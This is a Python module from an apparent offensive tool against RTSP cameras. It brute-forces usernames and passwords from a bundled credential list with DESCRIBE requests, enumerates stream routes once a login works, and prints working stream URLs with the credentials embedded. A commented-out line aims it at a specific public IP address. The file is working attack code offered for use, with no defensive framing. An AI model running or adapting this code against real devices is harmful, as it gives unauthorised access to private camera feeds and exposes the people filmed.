import socket, os, json
from . import attack_routes as ar
from . import auth_helper as ah
from colorama import init
from termcolor import colored

init()

def attackRoutesWithCreds(target, username, password, port, authmethod):
    try:
        foundStreams = []
        warnForMassiveFound = dict()
        warnForMassiveFound[target] = 0

        for route in ar.routeBuilder(username, password):
            if warnForMassiveFound[target] > 20:
                print(colored('[-] Ending detection for {} due to mass 200 response codes.'.format(target), 'red'))
                print(colored('[+] Try using: rtsp://{}:{}@{}:{}/'.format(username, password, target, port), 'green'))
                print(colored("-" * 40, 'cyan'))
                break

            receivedBuffer = ""
            seq = 1
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target,port))
            if authmethod == "digest":
                describeURL = "rtsp://{}:{}/{}".format(target, port, route)
                s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ""))
                receivedBuffer = s.recv(ah.configJson["bufLen"]).decode()
                seq += 1
            else:
                describeURL = "rtsp://{}:{}@{}:{}/{}".format(username, password, target, port, route)

            s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, receivedBuffer, username, password, "/{}".format(route))))
            tmpDescribeRecv = s.recv(ah.configJson["bufLen"]).decode()
            seq += 1
            if "RTSP/1.0 200" in tmpDescribeRecv:
                warnForMassiveFound[target] += 1
                foundStreams.append("rtsp://{}:{}@{}:{}/{}".format(username, password, target, port, route))
                # print("[+] Found stream: {}".format(describeURL))
        if warnForMassiveFound[target] <= 20 and warnForMassiveFound[target] > 0:
            for stream in foundStreams:
                print(colored("[+] Found Stream: {}".format(stream), 'green'))
        print(colored("-" * 40, 'cyan'))
    except:
        pass

def attackCredentials(target, port, authmethod):
    try:
        receivedBuffer = ""
        tmpDescribeRecv = ""
        seq = 1
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((target,port))

        describeURL = "rtsp://{}:{}{}".format(target, port, "/sdekfjvhejkhrv")
        # s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, receivedBuffer, "", "", "/sdekfjvhejkhrv")))
        # receivedBuffer = s.recv(ah.configJson["bufLen"]).decode()

        with open(os.path.join(os.path.dirname(__file__), 'resources\\creds.json'), 'r') as f:
            userpasslist = json.load(f)

        for username in userpasslist['usernames']:
            for password in userpasslist['passwords']:
                if authmethod == "digest":
                    s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ""))
                    receivedBuffer = s.recv(ah.configJson["bufLen"]).decode()
                    # print(receivedBuffer)
                    seq += 1

                s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, receivedBuffer, username, password, "/")))
                tmpDescribeRecv = s.recv(ah.configJson["bufLen"]).decode()
                seq += 1
                # print(tmpDescribeRecv)
                if "RTSP/1.0 404" in tmpDescribeRecv:
                    print(colored("[+] Attacking routes at {}:{} with valid username '{}' and password '{}' ({})...".format(target, port, username, password, authmethod), 'cyan'))
                    attackRoutesWithCreds(target, username, password, port, authmethod)
    except:
        pass

# attackCredentials("79.129.152.137", 554, "digest")
